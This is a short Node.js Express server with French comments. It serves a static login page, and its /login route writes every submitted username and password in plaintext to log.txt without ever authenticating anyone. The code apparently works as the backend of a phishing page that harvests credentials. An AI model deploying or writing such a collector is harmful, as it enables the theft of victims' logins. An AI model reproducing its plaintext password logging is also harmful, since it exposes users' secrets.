const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Pour lire les données du formulaire
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Servir les fichiers HTML/CSS/JS
app.use(express.static(path.join(__dirname, 'public')));

// Route racine (pour éviter Cannot GET /)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Enregistrement des identifiants reçus
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const log = `Nom d'utilisateur: ${username}, Mot de passe: ${password}\n`;
  fs.appendFileSync('log.txt', log);
  res.json({ message: "Identifiants reçus" });
});

// Lancer le serveur
app.listen(PORT, () => {
  console.log(`Serveur démarré sur le port ${PORT}`);
});
